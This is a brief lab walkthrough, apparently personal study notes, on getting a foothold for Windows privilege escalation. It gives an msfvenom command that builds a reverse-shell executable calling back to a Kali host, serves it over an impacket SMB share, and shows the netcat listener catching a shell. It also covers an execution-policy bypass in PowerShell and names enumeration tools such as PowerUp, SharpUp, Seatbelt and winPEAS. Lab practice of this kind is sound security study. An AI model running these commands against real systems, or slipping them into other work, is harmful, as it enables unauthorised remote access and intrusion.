# Windows Privelege Escalation

Windows IP Address: 10.0.2.30
Kali IP Address: 10.0.2.26

msfvenom Utility:
msfvenom is a compbination of Msfpayload and msfencode, putting both of these tools into a single Framework. 

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.26 LPORT=7777 -f exe -o ./reverse.exe

```
By the initisting the impacket file - smbserver.py, create the share directory:

```
python /usr/share/doc/python3-impacket/examples/smbserver.py tools .

```

Copy the reverse.exe created on kali machine to Windows Account(user):

```
copy \\10.0.2.26\reverse.

.\reverse.exe

```

Result:
```
└─$ nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.0.2.26] from (UNKNOWN) [10.0.2.30] 49740
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\PrivEsc>whoami
whoami
desktop-3ku67mt\user

C:\PrivEsc>

```
Get a powershell command from the CMD:

```
C:\PrivEsc>powershell.exe -exec bypass

PS C:\PrivEsc>
```

Information: PowerUp.ps1 and SharpUp.exe - those are tools to enumerate the Windows machine target.

Seatbelt.exe - also an enumeration tool to allow the privilege misconfiguration on a Windows machine

Winpeas - the same as LinPeas